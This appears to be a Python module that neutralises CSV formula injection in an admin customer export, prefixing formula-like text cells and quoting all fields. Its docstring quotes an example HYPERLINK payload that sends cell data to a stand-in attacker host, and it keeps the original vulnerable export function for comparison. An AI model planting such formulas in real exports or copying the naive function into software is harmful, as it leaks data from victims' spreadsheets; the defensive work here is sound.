"""Safe CSV export that neutralises spreadsheet formula injection.

The admin "Export customers" button wrote user-controlled fields (name,
company, notes) straight into a CSV. A customer who signed up with the name
``=HYPERLINK("https://attacker.test/?d="&C2,"Click")`` got a live formula
into every admin's spreadsheet, which can leak other cells or launch
commands through legacy DDE. This module follows the OWASP "CSV Injection"
guidance: every text cell that starts with ``= + - @``, a tab or a carriage
return is prefixed with a single quote so the spreadsheet shows it as text,
and every field is quoted so embedded separators cannot start a new cell.
"""
from __future__ import annotations

import csv
import io
from decimal import Decimal
from typing import Iterable, Mapping, Sequence

# Characters that make Excel, LibreOffice Calc and Google Sheets treat a cell
# as a formula (OWASP CSV Injection list).
FORMULA_TRIGGER_CHARACTERS = ("=", "+", "-", "@", "\t", "\r")

# A leading apostrophe tells spreadsheets "this is text"; it is not shown.
TEXT_PREFIX = "'"

CellValue = str | int | float | Decimal | None


def naive_export_csv(columns: Sequence[str], rows: Iterable[Mapping[str, CellValue]]) -> str:
    """Original export: writes values exactly as stored. Vulnerable."""
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(columns)
    for row in rows:
        writer.writerow([row.get(column, "") for column in columns])
    return buffer.getvalue()


def is_formula_like(text: str) -> bool:
    """True if a spreadsheet would try to evaluate this text as a formula."""
    return text.startswith(FORMULA_TRIGGER_CHARACTERS)


def neutralise_cell(value: CellValue) -> str:
    """Turn one value into a CSV-safe string.

    Real numbers are written as-is so that totals like -12.50 stay numeric
    in the spreadsheet. Only *text* is user-controlled, so only text gets
    the prefix — a string "-12.50" from a free-text field is still prefixed.
    """
    if value is None:
        return ""
    # bool is a subclass of int; treat it as text so "True" is not special.
    if isinstance(value, (int, float, Decimal)) and not isinstance(value, bool):
        return str(value)
    text = str(value)
    if is_formula_like(text):
        return TEXT_PREFIX + text
    return text


def safe_export_csv(columns: Sequence[str], rows: Iterable[Mapping[str, CellValue]]) -> str:
    """Write rows as CSV with every cell neutralised and every field quoted.

    QUOTE_ALL stops a value such as ``a",=1+1`` from closing its own field
    and starting a fresh, formula-bearing cell. Header names are neutralised
    too, because column names can come from user-defined custom fields.
    """
    buffer = io.StringIO()
    writer = csv.writer(buffer, quoting=csv.QUOTE_ALL, lineterminator="\n")
    writer.writerow([neutralise_cell(column) for column in columns])
    for row in rows:
        writer.writerow([neutralise_cell(row.get(column)) for column in columns])
    return buffer.getvalue()


def is_plain_number(text: str) -> bool:
    """True for cells like "-12.50" that a spreadsheet reads as a number."""
    try:
        Decimal(text)
    except ArithmeticError:
        return False
    # Decimal also accepts "NaN" and "Infinity"; those are not plain numbers.
    return Decimal(text).is_finite()


def cells_a_spreadsheet_would_evaluate(csv_text: str) -> list[str]:
    """Parse CSV text and return the cells that would run as formulas.

    Used by the tests as a stand-in for "open it in Excel": a parsed cell
    is dangerous if it begins with a formula trigger character and is not
    simply a number such as -12.50.
    """
    dangerous_cells: list[str] = []
    for row in csv.reader(io.StringIO(csv_text)):
        for cell in row:
            if is_formula_like(cell) and not is_plain_number(cell):
                dangerous_cells.append(cell)
    return dangerous_cells
